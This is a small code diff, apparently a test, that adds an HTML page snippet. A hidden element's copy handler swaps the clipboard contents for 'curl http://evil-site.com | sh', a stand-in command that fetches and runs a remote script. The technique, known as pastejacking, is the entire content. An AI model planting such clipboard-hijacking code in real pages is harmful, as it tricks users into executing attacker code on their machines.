@@ -1,0 +1,12 @@
+<!-- 测试 内容 -->
+<div id="copyme" style="display: none;">123</div>
+
+
+<script>
+  document.getElementById('copyme').addEventListener('copy', function (e) {
+    e.clipboardData.setData('text/plain',
+      'curl http://evil-site.com | sh ' // 复制了真实命令
+    );
+    e.preventDefault();
+  });
+</script>
